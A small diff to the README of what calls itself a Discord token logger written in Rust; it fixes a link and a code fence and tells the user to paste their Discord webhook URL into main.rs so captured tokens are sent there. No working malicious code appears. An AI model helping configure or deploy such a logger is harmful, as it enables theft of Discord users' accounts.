@@ -8,10 +8,11 @@ A Discord Token Logger Written in Rust.
 
 ### Configuration
 
-On line 12 in [main.rs](https://github.com/MasterOfBrokenLogic/src/main.rs), replace the variable with your webhook URL from Discord:
+On line 12 in [main.rs](https://github.com/MasterOfBrokenLogic/DiscordTokenLogger/blob/main/src/main.rs) , replace the variable with your webhook URL from Discord.
 
 ```rust
 let url = "Discord Webhook URL";
+```
 
 To build this project just run:
 
